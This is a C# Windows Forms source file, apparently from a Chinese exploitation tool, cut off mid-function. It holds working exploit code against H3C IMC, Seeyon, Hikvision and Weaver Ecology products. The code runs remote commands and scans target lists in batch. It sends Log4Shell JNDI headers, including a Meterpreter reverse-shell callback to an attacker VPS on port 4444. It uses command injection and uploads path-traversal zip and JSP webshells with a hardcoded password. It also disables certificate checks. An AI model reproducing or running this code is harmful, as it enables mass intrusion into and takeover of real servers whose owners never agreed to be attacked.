using Newtonsoft.Json.Linq;
using System;
using System.Diagnostics.Eventing.Reader;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Net.Security;
using System.Reflection.Metadata;
using System.Reflection.PortableExecutable;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Security.Policy;
using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Net.Mime.MediaTypeNames;
using static System.Net.WebRequestMethods;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.ToolBar;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.ToolTip;
using File = System.IO.File;

namespace 渗透测试漏洞挖掘src集成版
{

    public partial class Form1 : Form
    {
        private const string V = "/yyoa/ext/https/getSessionList.jsp?cmd=getAll";
        private HttpRequestMessage request;
        public Form1()
        {
            InitializeComponent();
        }

        private static bool RemoteCertificateValidate(object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors error)
        {

            return true;
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            button6.Enabled = false;
            button8.Enabled = false;
            button25.Enabled = false;
            comboBox1.Items.Add("struts045");
            comboBox1.Items.Add("struts046");
            comboBox_weaverUpAttack.Items.AddRange(new string[] { "Eoffice10-welink", "Eoffice10-iWebOffice_Up", "CNVD-2021-49104", "Eoffice8-webservice", "Ecology-workrelate-Upload", "Ecology-page-UploadOperation", "Ecology-ktree-UploadAction", "Ecology-ctrlzip-Upload" });
            comboBox_WeaveCMDAttack.Items.AddRange(new string[] { "E-Cology", "E-Mobile" });
            // 泛微上传这个 comboBox 如果用户没进行选择的话、那么默认索引为 E-Office10 的 IWebOffice 组件上传漏洞利用
            comboBox_weaverUpAttack.SelectedIndex = 1;

            comboBox2.Items.Add("All");
            comboBox2.Items.Add("致远 A8 htmlofficeservlet 任意文件上传");
            comboBox2.Items.Add("致远 OA ajax.do 任意文件上传");
            comboBox2.Items.Add("致远 OA wpsAssistServlet 任意文件上传");
        }

        private void button1_Click(object sender, EventArgs e)
        {

            try
            {
                ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;

                String url = textBox1.Text + "/imc/javax.faces.resource/dynamiccontent.properties.xhtml";
                HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
                req.Method = "POST";
                req.AllowAutoRedirect = true;
                req.ContentType = "application/x-www-form-urlencoded;charset=UTF-8";

                req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                String postid = "pfdrt=sc&ln=primefaces&pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH%2BN7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx%2FqFUj%2BDikXHLvbUMrMlNAqSFJpqoy%2FQywVdBmlVdx%2BvJelZEK%2BBwNF9J4p%2F1fQ8wJZL2LB9SnqxAKr5kdCs0H%2FvouGHAXJZ%2BJzx5gcCw5h6%2Fp3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D%2FukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd%2BLylDFB3dcYIgZtZoaSMAV3pyNoOzHy%2B1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3%2B9h0aurkyJVR28jIQlF4nT0nZqpixP%2Fnc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl%2BzoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH%2BOwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE%2BlsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU%3D&cmd=" + textBox2.Text;
                StreamWriter ss = new StreamWriter(req.GetRequestStream());
                ss.Write(postid);

                ss.Flush();



                HttpWebResponse response = (HttpWebResponse)req.GetResponse();


                StreamReader reader = new StreamReader(response.GetResponseStream());
                richTextBox1.Text = reader.ReadToEnd();
                if (richTextBox1.Text == "")
                {
                    MessageBox.Show("您的网络似乎出了点问题");
                }

                else
                {


                }

            }

            catch (Exception ex)
            {



            }

        }
        private void button2_Click(object sender, EventArgs e)
        {

            try
            {



                ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
                richTextBox1.Text = "开始批量RCE,h3c远程命令执行漏洞--------------------------------------------------------------" + "\r\n";
                String[] zidian1 = File.ReadAllLines("h3crce.txt");

                foreach (String s in zidian1)
                {

                    String targeturl = s + "/imc/javax.faces.resource/dynamiccontent.properties.xhtml";
                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(targeturl);
                    request.Method = "POST";


                    request.ContentType = "application/x-www-form-urlencoded;charset=UTF-8";
                    request.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
                    request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                    String postid = "pfdrt=sc&ln=primefaces&pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH%2BN7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx%2FqFUj%2BDikXHLvbUMrMlNAqSFJpqoy%2FQywVdBmlVdx%2BvJelZEK%2BBwNF9J4p%2F1fQ8wJZL2LB9SnqxAKr5kdCs0H%2FvouGHAXJZ%2BJzx5gcCw5h6%2Fp3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D%2FukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd%2BLylDFB3dcYIgZtZoaSMAV3pyNoOzHy%2B1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3%2B9h0aurkyJVR28jIQlF4nT0nZqpixP%2Fnc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl%2BzoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH%2BOwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE%2BlsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU%3D&cmd=whoami";
                    StreamWriter ss = new StreamWriter(request.GetRequestStream());
                    ss.Write(postid);
                    ss.Flush();



                    HttpWebResponse response = (HttpWebResponse)request.GetResponse();


                    StreamReader reader = new StreamReader(response.GetResponseStream());
                    textBox3.Text = reader.ReadToEnd();


                    //   if (response.StatusCode == HttpStatusCode.OK)

                    // if (response.StatusCode == HttpStatusCode.OK)
                    //   const string V = "nt authority\\system";
                    // const string V1 = "root";
                    if (textBox3.Text == "V")
                    {
                        richTextBox1.AppendText(s + "" + Environment.NewLine + textBox3.Text + "存在H3C命令执行漏洞");

                    }
                    else
                    {
                        richTextBox1.AppendText(s + "" + Environment.NewLine + textBox3.Text);




                    }



                }


            }

            catch (Exception ex)
            {


            }

        }

        private void button3_Click(object sender, EventArgs e)
        {
            ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
            String url = textBox4.Text + "/seeyon/main.do?method=login";
            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
            req.Method = "POST";
            req.AllowAutoRedirect = true;
            req.ContentType = "application/x-www-form-urlencoded";
            req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
            req.Headers.Add("X-Forwarded-For", "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://" + textBox5.Text + "}");
            //  req.Headers.Add("X-Client-IP", "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://" + "X-Client."+textBox8.Text + "}");
            string postid = "";
            ASCIIEncoding encoding = new ASCIIEncoding(); //编码
            byte[] byte1 = encoding.GetBytes(postid);
            req.ContentLength = byte1.Length;
            StreamWriter ss = new StreamWriter(req.GetRequestStream());
            ss.Write(postid);
            ss.Flush();//销毁
            HttpWebResponse response = (HttpWebResponse)req.GetResponse();

            Stream getStream = response.GetResponseStream();
            StreamReader streamreader = new StreamReader(getStream);
            textBox3.Text = streamreader.ReadToEnd();
            MessageBox.Show("rce发送完成,请查看你的dns or ceye");


        }

        private void button4_Click(object sender, EventArgs e)
        {
            MessageBox.Show("请确保vps已处于监听模式,默认监听端口为4444");
            ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
            String url = textBox4.Text + "/seeyon/main.do?method=login";
            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
            req.Method = "POST";
            req.AllowAutoRedirect = true;
            string encodedurl = WebUtility.UrlEncode(textBox6.Text);
            req.ContentType = "application/x-www-form-urlencoded";
            req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
            req.Headers.Add("X-Forwarded-For", "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://" + encodedurl + ":1389/TomcatBypass/Meterpreter/" + encodedurl + "/4444" + "}");

            //  req.Headers.Add("X-Client-IP", "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://" + "X-Client."+textBox8.Text + "}");
            string postid = "";
            ASCIIEncoding encoding = new ASCIIEncoding(); //编码
            byte[] byte1 = encoding.GetBytes(postid);
            req.ContentLength = byte1.Length;
            StreamWriter ss = new StreamWriter(req.GetRequestStream());
            ss.Write(postid);
            ss.Flush();//销毁
            HttpWebResponse response = (HttpWebResponse)req.GetResponse();

            Stream getStream = response.GetResponseStream();
            StreamReader streamreader = new StreamReader(getStream);

            textBox3.Text = streamreader.ReadToEnd();

            richTextBox2.Text = "反弹完成，请查看VPS";
        }

        private void button5_Click(object sender, EventArgs e)
        {
            if (textBox7.Text == "")
            {

                MessageBox.Show("请输入信息");

            }
            else
            {



                try
                {

                    ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
                    String url = textBox7.Text + "/SDK/webLanguage";

                    //    MessageBox.Show("默认请求路径/mz");
                    //     MessageBox.Show("默认执行env命令");
                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);

                    request.Method = "PUT"; //get请求方法
                    request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                    request.Accept = "*/*";
                    request.ContentType = "application/xml";
                    request.Credentials = null;
                    //    request.Headers.Add("Sec-Fetch-Dest", "document");
                    //     request.Headers.Add("Sec-Fetch-Mode", "navigate");
                    //    request.Headers.Add("Sec-Fetch-Site", "none");
                    //    request.Headers.Add("Sec-Fetch-User", "?1");
                    request.Headers.Add("X-Requested-With", "XMLHttpRequest");

                    string xmlData = "<?xml version='1.0' encoding='UTF-8'?><language>$(" + textBox8.Text + " > webLib/mz)</language>";
                    //      byte[] postData = Encoding.UTF8.GetBytes(xmlData);
                    //   request.ContentLength = postData.Length;
                    //  string replacedBody = xmlData.Replace("id", richTextBox5.Text);

                    ASCIIEncoding encoding = new ASCIIEncoding(); //编码
                    byte[] byte1 = encoding.GetBytes(xmlData);
                    request.ContentLength = byte1.Length;
                    StreamWriter ss = new StreamWriter(request.GetRequestStream());
                    ss.Write(xmlData);
                    ss.Flush();
                    button6.Enabled = true;
                    HttpWebResponse response = (HttpWebResponse)request.GetResponse();

                    Stream getStream = response.GetResponseStream();
                    StreamReader streamreader = new StreamReader(getStream);
                    String sss = streamreader.ReadToEnd();



                }

                catch (WebException ex)
                {

                    if (((HttpWebResponse)ex.Response).StatusCode == HttpStatusCode.InternalServerError)
                    {
                        MessageBox.Show("RCE发送完成");
                    }
                    else if (((HttpWebResponse)ex.Response).StatusCode == HttpStatusCode.Unauthorized)
                    {
                        MessageBox.Show("RCE发送完成");
                    }


                }
            }
        }

        // 处理任意传入的 TextBox 中所输入的 url 目标的情况、一般来说直接在 TextBox 那里复制粘贴就行了
        // 但是测试下来发现 C# textBox 如果直接粘贴超过 1200 行左右的话就会丢失后边部分的结果
        // 所以需要检测是否输入超过了 1200 行、如果超过了则提示用户需要采取输入文件路径的方式
        public static List<string> parseTargets(System.Windows.Forms.TextBox textBox, System.Windows.Forms.RichTextBox richtextBox)
        {
            if (textBox == null)
            {
                throw new ArgumentNullException(nameof(textBox), "textBox 控件不能为空");

            }
            // 获取所输入的文本
            string inputText = textBox.Text;
            // 判断输入的文本是否超过了 1200 行
            if (inputText.Split(new char[] { '\n' }, StringSplitOptions.RemoveEmptyEntries).Length > 1000)
            {
                // 如果超过了 1200 行则提示用户需要采取文件输入的方式
                MessageBox.Show("输入的目标过多、请采取文件输入的方式");
                return null;
            }
            // 检查文本是否为空
            if (string.IsNullOrEmpty(inputText))
            {
                // 如果文本为空、则抛出异常
                MessageBox.Show("目标不能为空!");
                return null;
            }
            // 通过换行符来分割文本
            string[] targetArray = inputText.Split(new char[] { '\n' }, StringSplitOptions.RemoveEmptyEntries);
            // 创建一个列表来存储目标字符串
            List<string> targets = new List<string>();
            // 遍历分割后的字符串数组
            foreach (string target in targetArray)
            {
                // 可以在这里添加额外的验证逻辑、例如去除空白字符或检查目标有效性
                // 检测输入的目标是否是一个有效的 URL
                if (!Uri.IsWellFormedUriString(target, UriKind.Absolute))
                {
                    // 如果不是有效的 URL 则以一种可复制粘贴的方式提示出来、并且暂时跳过这个目标                 
                    richtextBox.AppendText("[-] Err url:  " + target + "\n");
                    continue;
                }
                else
                {
                    // 只添加有效的 URL 到目标列表中、这样在加载目标时就可以通过所加载的目标数量来判断是否加载成功
                    targets.Add(target);
                }
            }
            return targets;
        }

        // 在要输出的 richTextBox 中打印目标加载情况:
        // 如果是单个目标则直接打印目标、如果是多个目标则打印第一个目标的信息跟最后一个目标的信息、中间部分用省略号、同时显示所加载的目标数量
        public static bool loadTargetsInfo(List<string> targets, System.Windows.Forms.RichTextBox richtextBox)
        {
            if (targets == null)
            {
                throw new ArgumentNullException(nameof(targets), "targets 列表不能为空");
                return false;
            }
            if (targets.Count == 0)
            {
                richtextBox.AppendText("[-] 加载目标失败、请检查输入" + "\n");
                return false;
            }
            if (targets.Count == 1)
            {
                richtextBox.AppendText("[*] 加载目标中....\n");
                richtextBox.AppendText("[+] " + targets[0] + "\n");
                richtextBox.AppendText("[*] 成功加载 1 个目标: " + "\n");
                return true;
            }
            else
            {
                richtextBox.AppendText("[*] 加载目标中....\n");
                // 打印第一个目标和最后一个目标的信息
                richtextBox.AppendText("[+] " + targets[0] + "\n");
                richtextBox.AppendText("[*] " + "中间省略.........." + "\n");
                richtextBox.AppendText("[+] " + targets[targets.Count - 1] + "\n");
                // 通过这里的数量来让使用者判断加载目标表是否正确
                richtextBox.AppendText("[*] 成功加载 " + targets.Count + " 个目标: " + "\n");
                return true;
            }

        }

        // 根据输入所指定的文件名长度生成一个指定长度且范围为全小写英文的文件名
        public static string GenerateRandomFileName(int length)
        {
            const string validChars = "abcdefghijklmnopqrstuvwxyz";
            var random = new Random();
            var fileName = new char[length];

            for (int i = 0; i < length; i++)
            {
                fileName[i] = validChars[random.Next(0, validChars.Length)];
            }
            return new string(fileName);
        }

        // 生成一个指定长度的随机数字字符串
        public static string GenerateRandomNumber(int length)
        {
            const string validChars = "0123456789";
            Random random = new Random();
            var number = new char[length];

            for (int i = 0; i < length; i++)
            {
                number[i] = validChars[random.Next(0, validChars.Length)];
            }

            return new string(number);
        }

        // 用于根据不同需求构造不同的恶意压缩包
        public static string GenerateAttackZip(string malware, int genType, string payloadName, string outPutName)
        {

            // 生成方式 1: 正常压缩包生成、正常将 malware 中的恶意脚本内容添加到压缩包中、并且文件名为 payloadName
            // 生成方式 2: 将 malware 中的内容读入添加到压缩包中、并且文件名为 payloadName、但是是按照生成 phar 恶意文件的方式构造
            // 生成方式 3: 将 malware 这个字符串的内容直接当作是要写入到压缩包中的内容、并且文件名为 payloadName
            switch (genType)
            {
                case 1:
                    // 正常生成压缩包模式、将 attackfileContent 内容读入添加到压缩包中、并且 attackfileContent 内容部分所对应的文件名为 payloadName
                    // 生成一个正常的压缩包

                    using (var zip = new System.IO.Compression.ZipArchive(File.Create(outPutName), System.IO.Compression.ZipArchiveMode.Create))
                    {
                        // 这里就是生成压缩包中的别的内容条目了 
                        var zipEntry = zip.CreateEntry(payloadName);
                        using (var zipStream = zipEntry.Open())
                        {
                            byte[] attackfileBytes = System.IO.File.ReadAllBytes(malware);
                            zipStream.Write(attackfileBytes, 0, attackfileBytes.Length);
                        }
                    }
                    return outPutName;
                case 2:

                    return "";
                case 3:
                    using (var zip = new System.IO.Compression.ZipArchive(File.Create(outPutName), System.IO.Compression.ZipArchiveMode.Create))
                    {
                        // 这里就是生成压缩包中的别的内容条目了 
                        var zipEntry = zip.CreateEntry(payloadName);
                        using (var zipStream = zipEntry.Open())
                        {
                            // 这里就不是读文件了，是直接读取 malware 这个字符串的内容了
                            byte[] attackfileBytes = Encoding.UTF8.GetBytes(malware);
                            zipStream.Write(attackfileBytes, 0, attackfileBytes.Length);
                        }
                    }
                    return outPutName;
                default:
                    // Code for default case
                    break;
            }

            // 这个函数如果成功生成了压缩包则返回生成的压缩包路径、否则返回空字符串
            return "";
        }


        private async Task weaver_CheckUpload_Ecology_ctrlzipUploadAsync(Uri url, RichTextBox richtextBox)
        {
            string poc_zip = "ctrlUploadPoc.zip";
            string poctxtName = GenerateRandomFileName(5);
            string payloadName = "../../../" + poctxtName + ".txt";
            // 10086.txt 里边的内容是一个随机的 32 位的字符
            string checkString = GenerateRandomFileName(32);
            // 检查 "ctrlUploadPoc.zip" 这个文件是否存在、如果存在则删除
            if (File.Exists(poc_zip))
            {
                File.Delete(poc_zip);
            }
            // 删除之后用我们新的这个随机 poc 去重新生成 "ctrlUploadPoc.zip" 这个文件
            try
            {
                if (GenerateAttackZip(checkString, 3, payloadName, poc_zip) == "")
                {
                    MessageBox.Show("[-] 生成 poc 压缩包失败");
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("[-] 生成 poc 压缩包异常: " + ex.Message);
                return;
            }

            // 之后就是类似其它文件上传的漏洞的发上传包这些了
            string baseUrl = url.Scheme + "://" + url.Host + ":" + url.Port;
            string poc1Url = baseUrl + "/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp";


            // 为 httpClient 设置走代理 127.0.0.1:8080 方便调试
            var handler = new HttpClientHandler
            {
                Proxy = new WebProxy("http://127.0.0.1:8080") // 设置代理服务器地址
            };

            using (var httpClient = new HttpClient(handler))
            {
                var req1 = new HttpRequestMessage(HttpMethod.Post, poc1Url);
                // 生成随机数字的分割线
                string randBoundry = GenerateRandomNumber(14);
                var multipartContent = new MultipartFormDataContent($"----{randBoundry}");
                // 生成上传时所用的四位随机压缩包名
                string randomZipFileString = GenerateRandomFileName(4);

                string pocZipName = randomZipFileString + ".zip";

                byte[] fileBytes = System.IO.File.ReadAllBytes(poc_zip);
                var fileContent = new ByteArrayContent(fileBytes);

                fileContent.Headers.ContentType = new MediaTypeHeaderValue("multipart/form-data");
                fileContent.Headers.ContentDisposition = new ContentDispositionHeaderValue("form-data")
                {
                    Name = "\"file\"",
                    FileName = $"\"{pocZipName}\""
                };
                multipartContent.Add(fileContent);
                req1.Content = multipartContent;
                httpClient.Timeout = TimeSpan.FromSeconds(10);
                try
                {
                    var resp1 = httpClient.SendAsync(req1).Result;
                    if (resp1.StatusCode == HttpStatusCode.OK)
                    {
                        string poc2Url = baseUrl + "/cloudstore/" + poctxtName + ".txt";
                        var req2 = new HttpRequestMessage(HttpMethod.Get, poc2Url);
                        var resp2 = httpClient.SendAsync(req2).Result;
                        // 请求 txt 文件存在才进行后一步精确检查
                        if (resp2.StatusCode == HttpStatusCode.OK)
                        {
                            if (resp2.Content.ReadAsStringAsync().Result.Contains(checkString))
                            {
                                richtextBox.AppendText("[+] " + url + " 存在 Ecology Ctrl 压缩包任意文件上传漏洞" + "\n");
                            }
                            else
                            {
                                return;
                            }
                        }
                        else
                        {
                            return;
                        }
                    }
                    else
                    {
                        return;
                    }
                }
                catch (Exception ex)
                {
                }
            }


        }
        private void weaver_UploadExp_Ecology_ctrlzipUpload(Uri url, RichTextBox richtextBox)
        {
            string exp_zip = "ctrlUploadExp.zip";
            string pocjspName = GenerateRandomFileName(5);
            string payloadName = "../../../" + pocjspName + ".jsp";
            // 检查 "ctrlUploadPoc.zip" 这个文件是否存在、如果存在则删除
            if (File.Exists(exp_zip))
            {
                File.Delete(exp_zip);
            }
            // 重新生成 exp 这个压缩包
            try
            {
                // 这里生成的压缩包模式就不一样了，是直接将恶意的 jsp 脚本写入到压缩包中
                if (GenerateAttackZip("api.jsp", 1, payloadName, exp_zip) == "")
                {
                    MessageBox.Show("[-] 生成 poc 压缩包失败");
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("[-] 生成 poc 压缩包异常: " + ex.Message);
                return;
            }

            // 之后就是类似其它文件上传的漏洞的发上传包这些了
            string baseUrl = url.Scheme + "://" + url.Host + ":" + url.Port;
            string poc1Url = baseUrl + "/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp";


            // 为 httpClient 设置走代理 127.0.0.1:8080 方便调试
            /*var handler = new HttpClientHandler
            {
                Proxy = new WebProxy("http://127.0.0.1:8080") // 设置代理服务器地址
            };
            */

            using (var httpClient = new HttpClient())
            {
                var req1 = new HttpRequestMessage(HttpMethod.Post, poc1Url);
                // 生成随机数字的分割线
                string randBoundry = GenerateRandomNumber(14);
                var multipartContent = new MultipartFormDataContent($"----{randBoundry}");
                // 生成上传时所用的四位随机压缩包名
                string randomZipFileString = GenerateRandomFileName(4);

                string pocZipName = randomZipFileString + ".zip";

                byte[] fileBytes = System.IO.File.ReadAllBytes(exp_zip);
                var fileContent = new ByteArrayContent(fileBytes);

                fileContent.Headers.ContentType = new MediaTypeHeaderValue("multipart/form-data");
                fileContent.Headers.ContentDisposition = new ContentDispositionHeaderValue("form-data")
                {
                    Name = "\"file\"",
                    FileName = $"\"{pocZipName}\""
                };
                multipartContent.Add(fileContent);
                req1.Content = multipartContent;
                httpClient.Timeout = TimeSpan.FromSeconds(10);
                try
                {
                    var resp1 = httpClient.SendAsync(req1).Result;
                    if (resp1.StatusCode == HttpStatusCode.OK)
                    {
                        string poc2Url = baseUrl + "/cloudstore/" + pocjspName + ".jsp";
                        var req2 = new HttpRequestMessage(HttpMethod.Get, poc2Url);
                        var resp2 = httpClient.SendAsync(req2).Result;
                        // GET 请求 JSP 文件如果存在的话直接就是 302、所以这个漏洞要访问它 cloudstore 这个路由的 jsp 的话其实就需要先可以破解出来的账号
                        if (resp2.StatusCode == HttpStatusCode.OK)
                        {
                            richtextBox.AppendText("[+] " + "Ecology ctrlZip 上传大概是成功了、但是需要有能进后台的 session 才能连接 " + poc2Url + " 天蝎连接 " + "pass: oldqax" + "\n");
                        }
                    }
                    else
                    {
                        richtextBox.AppendText("[*] " + "Ecology ctrlZip 上传失败、目标无法访问或漏洞已修补！！！\n");
                        return;
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show("[-] Check FileUpload Error!!!\n Ecology_CtrlZip:  " + url + ex.Message + "\n");
                    return;
                }
            }
        }


        private async Task weaver_CheckUpload_Ecology_ktreeUploadActionAsync(Uri url, RichTextBox richtextBox)
        {
            string baseUrl = url.Scheme + "://" + url.Host + ":" + url.Port;
            string poc1Url = baseUrl + "/weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image";

            using (var httpClient = new HttpClient())
            {
                var req1 = new HttpRequestMessage(HttpMethod.Post, poc1Url);
                string randBoundry = GenerateRandomFileName(32);
                var multipartContent = new MultipartFormDataContent($"{randBoundry}");
                string randomFileString = GenerateRandomFileName(6);
                string pocjspName = randomFileString + ".jsp";
                var fileContent = new ByteArrayContent(Encoding.UTF8.GetBytes("<%out.print(44470 * 44749);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>"));
                fileContent.Headers.ContentType = new MediaTypeHeaderValue("multipart/form-data");
                fileContent.Headers.ContentDisposition = new ContentDispositionHeaderValue("form-data")
                {
                    Name = "\"test\"",
                    FileName = $"\"{pocjspName}\""
                };
                multipartContent.Add(fileContent);
                req1.Content = multipartContent;
                httpClient.Timeout = TimeSpan.FromSeconds(10);
                try
                {
                    var resp1 = httpClient.SendAsync(req1).Result;
                    if (resp1.StatusCode == HttpStatusCode.OK)
                    {
                        // 服务器响应类似
                        //HTTP/1.1 200 OK
                        //Server: Resin / 3.1.8
                        //Cache - Control: private
                        //Set-Cookie: JSESSIONID=abcn28w6Ciqtgg6Ddej6y; path=/
                        //Content-Type: text/html; charset=GBK
                        //Connection: close
                        //Date: Fri, 29 Mar 2024 07:15:25 GMT
                        //Content-Length: 12
                        //{'original':'1892092801.jsp','url':'/formmode/apps/upload/ktree/images/17116965255531892092801.jsp','title':'','state':'SUCCESS'}

                        // 需要从这样的响应包里解析出 url 参数的值
                        // 但是由于它的响应包的字符集是 GBK、所以 resp1 要想不触发异常可以正常的解析出来、那就需要在读取 web 响应结果时设置正确的字符集
                        string charset = resp1.Content.Headers.ContentType.CharSet ?? Encoding.UTF8.WebName;
                        string resp1JsonRs = "";
                        // 不管服务器是什么响应都直接设置为 Encoding.UTF8 编码
                        using (var reader = new StreamReader(await resp1.Content.ReadAsStreamAsync(), Encoding.GetEncoding(Encoding.UTF8.WebName)))
                        {
                            resp1JsonRs = reader.ReadToEnd();
                        }

                        JObject resp1Json = JObject.Parse(resp1JsonRs);

                        string pocPath = "";
                        if (resp1Json != null && resp1Json["url"] != null)
                        {
                            pocPath = resp1Json["url"].Value<string>();
                        }
                        else { return; }

                        string poc2Url = baseUrl + pocPath;
                        var req2 = new HttpRequestMessage(HttpMethod.Get, poc2Url);
                        var resp2 = httpClient.SendAsync(req2).Result;
                        // 这后边应该是 200 或者 500 才能说明所上传的代码文件得到了执行吧
                        if (resp2.StatusCode == HttpStatusCode.OK)
                        {
                            if (resp2.Content.ReadAsStringAsync().Result.Contains("1989988030"))
                            {
